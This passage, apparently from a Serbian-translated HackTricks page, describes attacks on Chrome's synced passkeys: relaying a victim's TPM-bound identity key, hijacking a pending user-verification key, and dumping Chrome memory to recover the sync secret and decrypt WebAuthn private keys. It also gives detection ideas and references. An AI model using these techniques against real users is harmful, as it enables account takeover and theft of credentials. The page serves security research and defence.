NCryptSignHash(...)
```

To znači da **vezivanje za hardver sprečava izvoz van uređaja, ali ne i korišćenje od strane istog korisnika na kompromitovanoj krajnjoj tački**.

### Praktični načini zloupotrebe

1. **Pass-ta-key / prosleđivanje identiteta uređaja**<sup>[[4]](#references)</sup>
   - Nabrojati `WebauthnCredentialSpecifics` iz Chrome-ovog LevelDB-a.
   - Pokrenuti prijavu pomoću passkey-ja i pribaviti svež WebAuthn izazov.
   - Upotrebiti ukradeni blob `wrapped_identity_private_key` na TPM-u žrtve za potpisivanje binding-a zahteva cloud-authenticator-a.
   - Proslediti dobijenu assertion relying party-ju.
   - Ovo je posebno korisno kada RP prihvata `userVerification=preferred` ili ne odbacuje assertion-e sa **`UV=0`**.
2. **Otmica ključa na čekanju za UV**<sup>[[4]](#references)</sup>
   - Prisiliti ponovno podešavanje brisanjem `passkey_enclave_state` ili slanjem ispravne potpisane operacije `device/forget`.
   - Ako podešavanje ostavi uređaj u stanju **`uv_key_pending`**, registrovati UV javni ključ pod kontrolom napadača.
   - Ako provajder ne proverava attestation / poreklo ključa iz bezbednog hardvera za novi UV ključ, kasniji potpisi napadačevog ključa tretiraju se kao **`UV=1`**.
3. **Krađa master-secret-a / SDS-a za oporavak**<sup>[[4]](#references)</sup>
   - Prisiliti oporavak ili ponovno pridruživanje kako bi Chrome preuzeo sinhronizovanu master tajnu passkey-ja.
   - Pratiti ponovno kreiranje/izmenu `passkey_enclave_state`, a zatim napraviti dump Chrome-ove memorije dok je običan tekst **security domain secret (SDS)** prisutan.
   - Upotrebiti oporavljeni SDS za dešifrovanje šifrovanih polja u svakom zapisu `WebauthnCredentialSpecifics` i oporavak prenosivih privatnih WebAuthn ključeva.

### Ideje za DFIR / detekciju

- Pratiti **brisanje/ponovno kreiranje** datoteke `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Upozoriti na neuobičajen pristup Chrome-ovom **`Sync Data\LevelDB`** od strane procesa koji nisu pregledač.
- Upozoriti na **dump-ove Chrome-ove memorije** ili sumnjiv pristup memoriji između procesa.
- Istražiti ponovljene zahteve za **PIN-om za oporavak u Google Password Manager-u** ili neočekivano ponovno podešavanje.
- Imajte na umu da WebAuthn **`signCount`** često nije koristan za sinhronizovane passkey-je jer može ostati nepromenjen, pa je klasična detekcija kloniranja nepouzdana.

## References

- [1] [Unit 42 – Istraga višegodišnjih neotkrivenih operacija usmerenih na sektore visoke vrednosti](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: phishing pomoću Word VBA makroa preko SMTP-a → dešifrovanje hMailServer akreditiva → Veeam CVE-2023-27532 do SYSTEM-a](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Unutar Ink Dragon-a: otkrivanje relay mreže i unutrašnjeg funkcionisanja prikrivene ofanzivne operacije](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: nova površina napada u autentifikaciji bez lozinke](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG skladištenje ključeva](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hakovanje Windows-a: napadi na Microsoft sisteme i mreže](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Kako Active Directory skladište podataka zaista funkcioniše: unutrašnjost NTDS.dit (1. deo)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Daljinsko izvlačenje dump-a Lsass lozinki](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho proširuje svoj arsenal za sajber-špijunažu pomoću alata Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – funkcija CreateFileW i `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy režim rezervne kopije `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – prekidanje aktivnih sesija](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential Guard i Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: zaštita i upravljanje akreditivima](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
- [16] [S12 DumpNTDS.cpp](https://github.com/S12cybersecurity/HandleRedirect/blob/main/DumpNTDS/DumpNTDS/DumpNTDS.cpp)
{{#include ../../banners/hacktricks-training.md}}
